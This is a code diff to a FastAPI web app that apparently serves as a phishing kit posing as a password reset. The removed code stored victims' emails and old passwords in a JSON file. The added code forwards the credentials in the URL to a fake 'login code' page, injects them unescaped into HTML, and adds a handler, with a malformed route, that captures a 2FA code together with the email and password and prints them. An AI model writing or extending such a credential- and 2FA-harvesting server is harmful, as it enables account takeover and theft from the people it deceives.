@@ -1,8 +1,9 @@
 import os
-
-from fastapi import FastAPI, Form, Header, HTTPException
-from fastapi.responses import HTMLResponse, RedirectResponse
 import json
+
+from fastapi import FastAPI, Form, Header, HTTPException, Request
+from fastapi.responses import HTMLResponse, RedirectResponse
+from urllib.parse import urlencode
 from dotenv import load_dotenv
 
 
@@ -30,14 +31,25 @@ async def reset_failed():
 
 @app.post("/submit-form")
 async def submit_form(email: str = Form(...), old_password: str = Form(...)):
-    with open("details.json", "r") as f:
-        data = json.load(f)
-    data.append({"email": email, "old_password": old_password})
-    with open("details.json", "w") as f:
-        json.dump(data, f, indent=2)
+    query_params = urlencode({"email": email, "old-password": old_password})
+    return RedirectResponse(url=f"/login-code?{query_params}", status_code=303)
 
-    # After submit, always go to a logical ROUTE
-    return RedirectResponse(url="/reset-failed", status_code=303)
+
+@app.get("/login-code", response_class=HTMLResponse)
+async def login_code(request: Request):
+    email = request.query_params.get("email", "")
+    old_password = request.query_params.get("old-password", "")
+    with open("login-code.html", "r") as f:
+        page = f.read()
+
+    page = page.replace("{user-email}", email)
+    page = page.replace("{old-password}", old_password)
+    return page
+
+
+@app.post("submit-2fa")
+async def login(code: int = Form(...), email: str = Form(...), old_password: str = Form(...)):
+    print(code, email, old_password)
 
 
 @app.get("/read")
